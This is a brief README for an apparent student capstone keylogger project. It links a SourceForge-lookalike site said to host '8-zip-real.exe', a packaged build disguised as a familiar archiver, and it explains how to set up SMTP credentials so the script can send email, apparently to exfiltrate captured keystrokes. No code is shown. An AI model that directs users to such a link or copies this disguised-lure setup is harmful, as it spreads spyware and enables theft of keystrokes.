# fstack-keylog-capstone
Group 3 capstone project, spring 2024 cybersecurity cohort

https://sourceforge.weebly.com/

"8-zip-real.exe" is the executable generated from the script with pyinstaller, hosted on the above site.

To let email authentication work on the python script, create a YAML file called 'smtp-creds.yaml' in your working directory, with credentials in the following format:

user:

    email: <email>
    
    password: <pw>

smtp: <provider's SMTP server>

port: <provider's SMTP port, usually 587>
